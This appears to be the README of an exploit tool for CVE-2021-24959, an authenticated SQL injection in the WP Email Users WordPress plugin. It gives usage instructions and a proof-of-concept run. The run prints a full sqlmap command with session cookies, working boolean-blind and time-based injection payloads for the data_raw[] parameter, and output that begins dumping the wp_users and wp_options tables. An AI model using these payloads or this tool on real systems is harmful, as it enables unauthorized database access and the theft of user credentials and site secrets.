# CVE-2021-24959

Description
---

The WP Email Users WordPress plugin through 1.7.6 does not escape the data_raw parameter in the weu_selected_users_1 AJAX action, available to any authenticated users, allowing them to perform SQL injection attacks.

```
CVE 	CVE-2021-24959
CVSS 	8.8 (High)
Publicly Published 	January 31, 2022
Last Updated 	January 22, 2024
Researcher 	Krzysztof Zając - CERT PL
```

This tool will dump wp_users and wp_options.


How to use
---


```
usage: CVE-2021-24959.py [-h] -u URL [-un USERNAME] [-p PASSWORD]

WP Email Users <= 1.7.6 - SQL Injection Description: CVE-2021-24959 The WP Email Users WordPress plugin through 1.7.6 does not escape the data_raw parameter in the
weu_selected_users_1 AJAX action, available to any authenticated users, allowing them to perform SQL injection attacks.

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Website URL
  -un USERNAME, --username USERNAME
                        WordPress username
  -p PASSWORD, --password PASSWORD
                        WordPress password
```

POC
---

```
python3 CVE-2021-24959.py -u http://kubernetes.docker.internal -un user -p user
The plugin version is below 1.7.7.
The plugin version is 1.7.6
Vulnerability check: http://kubernetes.docker.internal
Logged in successfully.
Command Line: sqlmap.py -u "http://kubernetes.docker.internal/wp-admin/admin-ajax.php"  --data="data_raw%5B%5D=&action=weu_selected_users_1" --time-sec=10 --threads 4  --batch -p data_raw[] -T wp_users,wp_options --dump --referer="http://kubernetes.docker.internal/wp-admin/" --level 3 --risk 3  --technique=BT --dbms=mysql --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3" --cookie "_lscache_vary=36193a4836ccd8886b480d97874c6e09; wordpress_logged_in_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1727270083%7CypC9NnM7X9UHKJQQn6iQAMjiJuiEifptBohNqPTbX5s%7Cd4a37484820e7215c7d4f6e255c1f5204b49557392dc6368d7270784a63bdd9f; wordpress_test_cookie=WP+Cookie+check; wp-settings-time-1=1727097284; wordpress_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1727270083%7CypC9NnM7X9UHKJQQn6iQAMjiJuiEifptBohNqPTbX5s%7C296a7aa7ab54b062d71a4f60399e41643aba06b9b13ccbc4cdb13bf0b262a7a9; wordpress_e2df32a6c3e7076dd7dc7d3f3fec39aa=admin%7C1727270083%7CypC9NnM7X9UHKJQQn6iQAMjiJuiEifptBohNqPTbX5s%7C296a7aa7ab54b062d71a4f60399e41643aba06b9b13ccbc4cdb13bf0b262a7a9"
___
__H__
___ ___[(]_____ ___ ___  {1.8.7#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
|_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:14:44 /2024-09-23/

[14:14:44] [WARNING] provided value for parameter 'data_raw[]' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:14:44] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: data_raw[] (POST)
Type: boolean-based blind
Title: OR boolean-based blind - WHERE or HAVING clause
Payload: data_raw[]=-1975 OR 3344=3344&action=weu_selected_users_1

Type: time-based blind
Title: MySQL >= 5.0.12 time-based blind - Parameter replace
Payload: data_raw[]=(CASE WHEN (8496=8496) THEN SLEEP(10) ELSE 8496 END)&action=weu_selected_users_1
---
[14:14:44] [INFO] testing MySQL
[14:14:44] [INFO] confirming MySQL
[14:14:44] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9 (stretch)
web application technology: Apache 2.4.25, PHP 7.3.5
back-end DBMS: MySQL >= 5.0.0
[14:14:44] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:14:44] [INFO] fetching current database
[14:14:44] [INFO] retrieving the length of query output
[14:14:44] [INFO] resumed: 9
[14:14:44] [INFO] resumed: wordpress
[14:14:44] [INFO] fetching columns for table 'wp_users' in database 'wordpress'
```
